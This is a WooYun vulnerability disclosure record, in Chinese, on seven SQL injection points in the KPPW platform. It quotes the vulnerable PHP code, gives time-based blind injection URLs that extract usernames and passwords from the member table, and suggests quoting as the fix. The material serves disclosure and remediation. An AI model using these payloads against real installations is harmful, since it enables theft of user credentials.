{"id": 42200, "wybug_id": "wooyun-2014-086459", "wybug_title": "KPPW最新版SQL注入漏洞七(多处不同注入点)", "wybug_corp": "keke.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-10 11:07", "wybug_open_date": "2015-03-10 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向公众公开  简要描述： KPPW最新版SQL注入漏洞七(多处不同注入点) 详细说明：  KPPW最新版SQL注入漏洞七，多处不同注入点第一处sql注入：文件/control/user/transaction_works.php:\nif($action == 'delete_image'){\t$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileid);\t$arrFileInfo = db_factory::get_one($strSql);\t$resText = CommonClass::delFileByFileId($fileid);\tif($resText){\t\t$array = explode(',', $arrServiceInfo['pic']);\t\t$newArr = CommonClass::returnNewArr($arrFileInfo['save_name'], $array);\t\t$_POST['file_ids'] = implode(\",\", $newArr);\t\tupdateFilepath($arrServiceInfo['service_id'], $_POST['file_ids'], 'pic');\t\tkekezu::echojson('删除成功',1,array('fileid'=>$fileid,'save_name'=>$arrFileInfo['save_name']));die;\t}}\n注意这里：\n$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileid);\n$fileid没有引号保护进入sql语句，导致存在注入第二，三处sql注入：继续看下面的：\n$resText = CommonClass::delFileByFileId($fileid);\n$fileid继续进入了函数delFileByFileId，跟进函数delFileByFileId：文件：/lib/inc/CommonClass.php\npublic static function delFileByFileId($fileId){\t\t$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileId);\t\t$arrFileInfo = db_factory::get_one($strSql);\t\t$filename = S_ROOT.$arrFileInfo['save_name'];\t\tif(file_exists($filename)){\t\t\tunlink($filename);\t\t}\t\treturn db_factory::execute(\"delete from \".TABLEPRE.\"witkey_file where file_id = \".$fileId);\t}\n这里存在两处注入，$fileid变量进入select和delete语句都没有处理，导致sql注入第四，五，六处sql注入：同意的问题出现在文件/control/user/transaction_works.php：\nif($action == 'delete_goodsfile'){\t$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileid);\t$arrFileInfo = db_factory::get_one($strSql);\t$resText = CommonClass::delFileByFileId($fileid);\tif($resText){\t\t$array = explode(',', $arrServiceInfo['file_path']);\t\t$newArr = CommonClass::returnNewArr($arrFileInfo['save_name'], $array);\t\t$_POST['file_path_2'] = implode(\",\", $newArr);\t\tupdateFilepath($arrServiceInfo['service_id'], $_POST['file_path_2'], 'file');\t\tkekezu::echojson('删除成功',1,array('fileid'=>$fileid,'save_name'=>$arrFileInfo['save_name']));die;\t}}\n这里的问题跟上面分析的问题一样，存在注入。第七处sql注入：文件/control/user/transaction_works.php：\nif (isset($formhash)&&kekezu::submitcheck($formhash)) {\t$arrGoodsConfig = unserialize($kekezu->_model_list[6]['config']);\t$goodsprice   = floatval($goodsprice);\t$floatMinCash = floatval($arrGoodsConfig['min_cash']);\tif($floatMinCash&&($goodsprice < $floatMinCash)){\t\t$tips['errors']['goodsprice'] = '最小金额不能少于'.$floatMinCash.'元';\t\tkekezu::show_msg($tips,null,NULL,NULL,'error');\t}\tif (strtoupper ( CHARSET ) == 'GBK') {\t\t$goodsname = kekezu::utftogbk($goodsname );\t\t$goodsdesc = kekezu::utftogbk($goodsdesc );\t\t$unite_price = kekezu::utftogbk($unite_price );\t}\t$arrData = array(\t\t\t'model_id'\t\t=> $arrServiceInfo['model_id']?$arrServiceInfo['model_id']:6,\t\t\t'uid'\t\t\t=> $gUid,\t\t\t'username'\t\t=> $gUserInfo['username'],\t\t\t'indus_id'\t\t=> $indus_id,\t\t\t'indus_pid'\t\t=> $indus_pid,\t\t\t'title'\t\t\t=> $goodsname,\t\t\t'price'\t\t    => $goodsprice,\t\t\t'pic'\t\t\t=> $file_ids,\t\t\t'content'\t\t=> $goodsdesc,\t\t\t'unite_price'\t=> $unite_price,\t\t\t'submit_method'\t=> $submit_method,\t\t\t'file_path'\t\t=> $file_path_2,\t\t\t'confirm_max'   => intval($arrGoodsConfig['confirm_max_day'])\t);\tif(!$pk['service_id']){\t\t$arrData['profit_rate'] = $arrGoodsConfig['service_profit'];\t\t$arrData['on_time'] = time();\t\t$arrData['service_status'] = 2;\t}\t$objServiceT = new keke_table_class ( 'witkey_service' );\t$objServiceT->save ( $arrData,$pk);\tunset($objServiceT);\tif ($objId&&$intTaskId) {\t\t$strBidSql  = ' UPDATE `'.TABLEPRE.'witkey_task_bid`  SET `hasdel`=1 WHERE (`bid_id` ='.$objId.')  and task_id = '.$intTaskId;\t\t$strWorkSql = ' UPDATE `'.TABLEPRE.'witkey_task_work` SET `hasdel`=1 WHERE (`work_id`='.$objId.')  and task_id = '.$intTaskId;\t\tdb_factory::execute($strBidSql);\t\tdb_factory::execute($strWorkSql);\t}\tkekezu::show_msg('操作成功',$strJumpUrl,NULL,NULL,'ok');}\n注意这里的：\n$objServiceT->save ( $arrData,$pk);\n这里的变量$pk进入了save函数，跟进save函数文件/lib/inc/keke_table_class.php：\nfunction save($fields, $pk = array()) {\t\tforeach ( $fields as $k => $v ) {\t\t\t$kk = ucfirst ( $k );\t\t\t$set_query = \"set\" . $kk;\t\t\t$this->_table_obj->$set_query ( $v );\t\t}\t\t$keys = array_keys ( $pk );\t\t$key = $keys [0];\t\t//echo $key.\"\\n\";\t\t//print_r($pk);\t\t//echo $pk[$key];\t\tif (! empty ( $pk [$key] )) {\t\t\t$this->_table_obj->setWhere ( \" $key = '\" . $pk [$key] . \"'\" );\t\t\t$edit_query = \"edit_\" . $this->_pre . $this->_table_name;\t\t\t$res = $this->_table_obj->$edit_query ();\t\t} else {\t\t\t$create_query = \"create_\" . $this->_pre . $this->_table_name;\t\t\t$res = $this->_table_obj->$create_query ();\t\t}\t\tif ($res) {\t\t\treturn $res;\t\t} else {\t\t\treturn false;\t\t}\t}\n最后$pk的key进入了setWhere条件语句中，导致sql注入   漏洞证明：  第一处SQL注入：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=user&view=transaction&op=editwork&action=delete_image&fileid=5566) and 1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=char(97),sleep(5),2)%23\n这里会延迟5秒返回，说明UserName第一个字符为a，继续即可注入出用户信息第二，三处SQL注入：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=user&view=transaction&op=editwork&action=delete_image&fileid=5566 and 1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=char(97),sleep(5),2)\n这里会延迟5秒返回，说明UserName第一个字符为a，继续即可注入出用户信息\n\n第七处SQL注入：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=user&view=transaction&op=editworkformhash=6cb7d4&objId=0&pk%5Bservice_id=1+and+1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=char(97),sleep(5),2)%23%5D=222222&goodsname=111&goodsdesc=111&indus_pid=249&indus_id=-1&upload=&file_ids=&goodsprice=111&unite_price=%E4%B8%AA&submit_method=outside&file_upload_i=&file_path_2=\n这里会延迟5秒返回，说明UserName第一个字符为a，继续即可注入出用户信息   修复方案：  加单引号保护即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-10 17:23 厂商回复： 已修改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}